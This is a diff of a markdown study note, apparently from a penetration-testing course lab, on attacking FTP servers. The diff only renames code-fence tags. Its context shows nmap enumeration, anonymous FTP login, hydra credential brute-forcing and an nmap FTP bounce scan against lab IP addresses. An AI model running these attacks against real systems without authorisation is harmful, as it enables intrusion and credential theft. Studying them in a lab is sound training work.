@@ -2,12 +2,12 @@
 ## Enumeration
 Nmap default scripts `-sC` includes the `ftp-anon` Nmap script which checks if a FTP server allows anonymous logins.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ sudo nmap -sC -sV -p 21 192.168.2.142 
 ```
 
 ## Anonymous Authentication
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ ftp 192.168.2.142    
                      
 Connected to 192.168.2.142.
@@ -29,12 +29,12 @@ Once we get access to an FTP server with anonymous credentials, we can start sea
 
 ## Protocol Specifics Attacks
 ### Brute Force
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ hydra -L usernames.txt -P passwords.txt -s 2121 ftp://10.129.25.246
 ```
 
 ### FTP Bounce Attack
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
